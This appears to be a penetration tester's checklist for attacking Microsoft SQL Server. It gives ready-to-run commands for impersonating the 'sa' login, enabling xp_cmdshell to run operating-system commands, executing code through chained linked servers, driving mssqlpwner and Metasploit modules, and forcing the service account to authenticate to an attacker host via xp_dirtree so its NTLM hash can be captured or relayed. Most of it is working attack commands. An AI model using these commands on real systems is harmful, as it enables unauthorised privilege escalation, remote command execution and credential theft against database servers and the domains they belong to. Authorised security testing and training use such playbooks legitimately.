# MSSQL impersonation & links

## Before I start
- [ ] Connected with whatever I have — guest SQL auth, reused password, domain user: :Pb mssql
impacket-mssqlclient <Domain>/<User>:'<Password>'@<Host> -windows-auth

## Who can I impersonate
SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
- [ ] sa or any privileged login in the list: impersonate straight up
- [ ] Nobody listed: go look at the links FIRST, re-run this check on each link

## Become them
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
- [ ] Shell lands as the SQL SERVICE account — check its domain rights, they are rarely small
- [ ] Automation instead: msf auxiliary/admin/mssql/mssql_escalate_execute_as (db_owner variant: mssql_escalate_dbowner)

## Links: what does this server trust
EXEC sp_linkedservers;
SELECT * FROM master..sysservers;
SELECT * FROM OPENQUERY("SQL2", 'SELECT SYSTEM_USER');
- [ ] The link's login on the far side is usually MORE privileged than mine here — that is the privesc
- [ ] Whole chain mapped from a Windows host: Get-SQLServerLinkCrawl -Instance <Host> -Verbose

## Command execution through a link
EXECUTE('sp_configure ''show advanced options'',1; reconfigure;') AT "SQL2";
EXECUTE('sp_configure ''xp_cmdshell'',1; reconfigure;') AT "SQL2";
EXECUTE('exec master..xp_cmdshell ''whoami''') AT "SQL2";
- [ ] OPENQUERY can't run procedures: EXECUTE(...) AT is the form — and every nesting level DOUBLES the single quotes
- [ ] Second hop: SELECT * FROM OPENQUERY("SQL1", 'SELECT * FROM OPENQUERY("SQL2", ''exec xp_cmdshell ''''whoami''''''')');

## From Kali with mssqlpwner
mssqlpwner <Domain>/<User>:<Password>@<Host> -windows-auth -max-impersonation-depth 2 interactive
mssqlpwner <Domain>/<User>:<Password>@<Host> -windows-auth -link-name SQL2 exec hostname
- [ ] interactive: enum_links, use_link [NAME], then impersonation checks again at the new hop

## The companion move: steal the service account's hash
EXEC xp_dirtree '\\<AttackerIP>\share';
- [ ] Responder catches the SQL service account's Net-NTLMv2: :Pb responder
- [ ] Or relay it: :Pb ntlm-relay

## Next
- [ ] Service account cred/hash tested across the domain: :Pb lateral-movement
- [ ] Service account has an SPN (it does — it's MSSQL): roast it for the password: :Pb kerberoasting
